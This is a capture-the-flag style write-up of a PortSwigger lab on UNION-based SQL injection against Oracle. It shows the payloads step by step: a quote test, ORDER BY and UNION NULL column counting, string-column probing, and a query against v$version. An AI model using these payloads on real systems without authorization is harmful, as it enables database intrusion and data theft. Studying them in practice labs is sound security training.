# SQL Injection Attack — Querying Database Type and Version on Oracle

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Display the database version string using a UNION-based SQL injection attack.

---

## Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

This is a **UNION-based SQL injection** — the application returns query results directly in the response. We inject a UNION query to append our own SELECT statement and read the output on the page.

On **Oracle**, every SELECT must have a FROM clause. Oracle provides a built-in dummy table called `dual` for this purpose:

```sql
SELECT 'value' FROM dual
```

Oracle version query:
```sql
SELECT * FROM v$version
SELECT banner FROM v$version
```

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

The injection point is the **product category filter** in the URL:

```
https://lab-id.web-security-academy.net/filter?category=Gifts
```

Inject a single quote to confirm SQLi:

```
/filter?category=Gifts'
```

Application returns an error — confirms SQL injection vulnerability.

<img width="1235" height="454" alt="image" src="https://github.com/user-attachments/assets/44dff92f-0520-439d-b1d4-5974c3beeab9" />

---

**Step 2 — Find Number of Columns**

Use ORDER BY to find the number of columns:

```
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
```

When the response errors → previous number = column count.

<img width="1455" height="399" alt="image" src="https://github.com/user-attachments/assets/744912ca-a031-4786-8267-360748d5c8e6" />

Then confirm with UNION NULL — on Oracle use `FROM dual`:

```
/filter?category=Gifts' UNION SELECT NULL FROM dual--
/filter?category=Gifts' UNION SELECT NULL,NULL FROM dual--
```

Columns found: **2**

<img width="1428" height="450" alt="image" src="https://github.com/user-attachments/assets/47ab09ec-8bdc-4774-86b7-38dd88134109" />

---

**Step 3 — Find String Columns**

Replace NULLs with strings to find which columns display text:

```
/filter?category=Gifts' UNION SELECT 'a','b' FROM dual--
```

Both columns return strings — both usable for output.

<img width="486" height="189" alt="image" src="https://github.com/user-attachments/assets/ba67639e-e44f-4d27-a1a7-da5deda53d14" />

---

**Step 4 — Extract Database Version**

Oracle version is stored in `v$version`:

```
/filter?category=Gifts' UNION SELECT banner,NULL FROM v$version--
```

The version string appears in the page response.

<img width="773" height="238" alt="image" src="https://github.com/user-attachments/assets/b195d20b-75d2-41b7-a849-0462e0b376b7" />

---

**Lab Solved**

<img width="1511" height="760" alt="image" src="https://github.com/user-attachments/assets/a482043f-17c7-4cbb-92a6-6e217bf7581e" />

---

## Key Oracle Differences

| | Oracle | Other Databases |
|--|--------|----------------|
| FROM required | Yes — use `FROM dual` | No |
| Version query | `SELECT banner FROM v$version` | `SELECT @@version` or `SELECT version()` |
| Comment style | `--` | `--` or `#` |
| String concat | `'a'\|\|'b'` | `'a'+'b'` or `CONCAT('a','b')` |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
